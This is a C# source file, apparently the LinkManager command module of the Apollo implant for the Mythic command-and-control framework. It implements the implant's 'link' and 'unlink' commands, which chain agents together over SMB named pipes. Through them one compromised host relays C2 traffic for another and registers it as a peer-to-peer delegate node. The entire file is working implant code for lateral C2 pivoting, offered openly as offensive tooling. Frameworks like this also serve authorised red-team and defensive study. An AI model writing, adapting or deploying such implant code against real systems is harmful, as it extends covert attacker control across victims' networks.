#if DEBUG
#undef LINK
#undef UNLINK
#define UNLINK
#define LINK
#endif

#if LINK || UNLINK

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Apollo.Jobs;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Mythic.Structs;
using Mythic.C2Profiles;
using C2Relays;
using Mythic.C2Profiles;
using Apollo.Tasks;
using System.Threading;

namespace Apollo.CommandModules
{
    class LinkManager
    {

        public struct UnlinkMessage
        {
            public string action;
        }
        public static void Execute(Job job, Agent implant)
        {
            switch (job.Task.command)
            {
#if LINK
                case "link":
                    Link(job, implant);
                    break;
#endif
#if UNLINK
                case "unlink":
                    Unlink(job, implant);
                    break;
#endif
                default:
                    job.SetError($"Unable to determine how to dispatch command \"{job.Task.command}\"");
                    break;
            }
        }
#if UNLINK
        private static void Unlink(Job job, Agent implant)
        {
            LinkMessage linkMsg = JsonConvert.DeserializeObject<LinkMessage>(job.Task.parameters);
            string agentUUID = linkMsg.connection_info.agent_uuid;
            string message;
            if (agentUUID == null || agentUUID == "")
            {
                job.SetError($"Could not unlink from {linkMsg.connection_info.host} as no agent UUID could be parsed.");
            } else
            {
                // In the future, we need to change DelegateNodes to a list of delegate nodes,
                // which is then filtered down for unlinking and passing messages. Current model
                // will not support multiple P2P agents from one host to another.
                if (!implant.DelegateNodes.ContainsKey(agentUUID))
                {
                    job.SetError($"No such connection to {linkMsg.connection_info.host} (Agent {linkMsg.connection_info.agent_uuid} using {linkMsg.connection_info.c2_profile.name.ToUpper()}) exists.");
                    return;
                }
                DelegateNode dg = implant.DelegateNodes[agentUUID];
                switch (linkMsg.connection_info.c2_profile.name.ToLower())
                {
                    case "smbserver":
                        SMBClientProfile hLinkedAgentProfile = (SMBClientProfile)dg.NodeRelay.MessageProducer;
                        var unlinkMsg = new UnlinkMessage()
                        {
                            action = "unlink"
                        };
                        message = JsonConvert.SerializeObject(unlinkMsg);
                        hLinkedAgentProfile.Send("", message);
                        implant.RemoveDelegateNode(agentUUID);
                        job.SetComplete($"Successfully unlinked {linkMsg.connection_info.host} ({linkMsg.connection_info.c2_profile.name.ToUpper()})");
                        break;
                    default:
                        job.SetError($"Unknown peer-to-peer profile \"{linkMsg.connection_info.c2_profile.name}\"");
                        break;
                }
            }
        }
#endif
#if LINK
        private static void Link(Job job, Agent implant)
        {
            LinkMessage linkMsg = JsonConvert.DeserializeObject<LinkMessage>(job.Task.parameters);
            ConnectionInfo connInfo = linkMsg.connection_info;
            C2ProfileInfo profileInfo = connInfo.c2_profile;
            C2Profile profile;
            bool outbound;
            ApolloTaskResponse response;


            switch (profileInfo.name.ToLower())
            {
                case "smbserver":
                    string pipeName = profileInfo.parameters["PIPE_NAME".ToLower()];
                    string hostName = connInfo.host;
                    try
                    {
                        profile = new SMBClientProfile(pipeName, hostName, implant.Profile.cryptor);
                    }
                    catch (Exception ex)
                    {
                        job.SetError(String.Format("Failed to link to {0} over named pipe \"{1}\". Reason: {2}", hostName, pipeName, ex.Message));
                        break;
                    }
                    SMBRelay relay = new SMBRelay((SMBClientProfile)profile, implant.Profile, job.Task.id);
                    outbound = true;
                    string newAgentGUIDMsg = Guid.NewGuid().ToString();
                    Thread t = new Thread(() => relay.BeginRelay(newAgentGUIDMsg));
                    t.Start();
                    string tempLinkedUUID = (string)MessageInbox.Inbox.GetMessage(newAgentGUIDMsg);
                    DelegateNode delegateNode = new DelegateNode()
                    {
                        // AgentUUID = tempLinkedUUID,
                        NodeRelay = relay,
                        // TemporaryUUID = true,
                        OutboundConnect = outbound,
                        OriginatingTaskID = job.Task.id,
                        AgentComputerName = hostName,
                        ProfileInfo = profileInfo
                    };
                    EdgeNode en = new EdgeNode()
                    {
                        source = implant.uuid,
                        destination = tempLinkedUUID,
                        direction = 1, // from source to dest
                        metadata = "",
                        action = "add",
                        c2_profile = profileInfo.name
                    };
                    if (tempLinkedUUID.StartsWith("staging-"))
                    {
                        tempLinkedUUID = tempLinkedUUID.Replace("staging-", "");
                        delegateNode.AgentUUID = tempLinkedUUID;
                        delegateNode.TemporaryUUID = true;
                        //string linkedUUID = relay.InitializeRelay();
                        implant.AddDelegateNode(tempLinkedUUID, delegateNode);
                        string realUUID = (string)MessageInbox.Inbox.GetMessage(newAgentGUIDMsg);
                        //Thread t = new Thread(() => relay.BeginRelay(newAgentGUIDMsg));
                        //t.Start();

                        implant.RemoveDelegateNode(tempLinkedUUID);
                        delegateNode.AgentUUID = realUUID;
                        delegateNode.TemporaryUUID = false;
                        implant.AddDelegateNode(realUUID, delegateNode);
                        en.destination = realUUID;
                    } else
                    {
                        // this is a real uuid already staged
                        delegateNode.AgentUUID = tempLinkedUUID;
                        delegateNode.TemporaryUUID = false;
                        implant.AddDelegateNode(tempLinkedUUID, delegateNode);
                    }

                    response = new ApolloTaskResponse(job.Task, $"Established link to {hostName}", new EdgeNode[] { en });
                    //implant.TryPostResponse(response);
                    //implant.Profile.Send(JsonConvert.SerializeObject(new EdgeNodeMessage()
                    //{
                    //    edges = new EdgeNode[] { en }
                    //}));
                    job.SetComplete(response);
                    //relay.BeginRelay();
                    break;
                default:
                    job.SetError("Unsupported code path in LinkManager.");
                    break;
            }
        }
#endif
    }
}
#endif